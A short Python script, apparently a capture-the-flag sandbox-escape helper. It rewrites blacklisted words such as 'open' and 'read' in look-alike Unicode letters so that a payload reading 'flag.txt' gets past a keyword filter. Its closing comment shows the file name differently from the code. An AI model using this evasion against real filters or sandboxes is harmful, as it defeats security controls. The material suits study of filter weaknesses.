BLACKLIST = ["open", "read"]

def to_unicode(s):
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    return ''.join([chr(alphabet.index(c) + 0x1D608) if c in alphabet else c for c in s])

def obfuscate(payload):
    for word in BLACKLIST:
        payload = payload.replace(word, to_unicode(word))

    return payload

print(obfuscate('open("flag.txt").read()'))  # 𝘰𝘱𝘦𝘯("flag").𝘳𝘦𝘢𝘥()